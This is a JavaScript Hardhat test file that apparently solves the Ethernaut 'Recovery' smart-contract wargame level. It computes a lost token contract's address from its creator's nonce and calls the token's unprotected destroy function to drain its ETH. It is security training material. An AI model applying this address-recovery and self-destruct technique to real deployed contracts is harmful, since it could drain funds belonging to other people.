const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Seventeen", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const EthernautSeventeenRecovery = await ethers.getContractFactory(
      "EthernautSeventeenRecovery"
    );
    const ethernautSeventeenRecovery =
      await EthernautSeventeenRecovery.deploy();
    await ethernautSeventeenRecovery.generateToken("Simple Token", 0);

    return { deployer, ethernautSeventeenRecovery };
  }

  describe("Exploit", function () {
    it("Can drain ETH", async function () {
      const { deployer, ethernautSeventeenRecovery } = await loadFixture(
        deployToken
      );
      const nonceBeforeTokenDeploy = 1;
      const tokenAddress = ethers.utils.getContractAddress({
        from: ethernautSeventeenRecovery.address,
        nonce: nonceBeforeTokenDeploy,
      });
      const token = await ethers.getContractAt(
        "EthernautSeventeenSimpleToken",
        tokenAddress
      );

      expect(await token.name()).to.equal("Simple Token");
      await token.destroy(deployer.address);
    });
  });
});
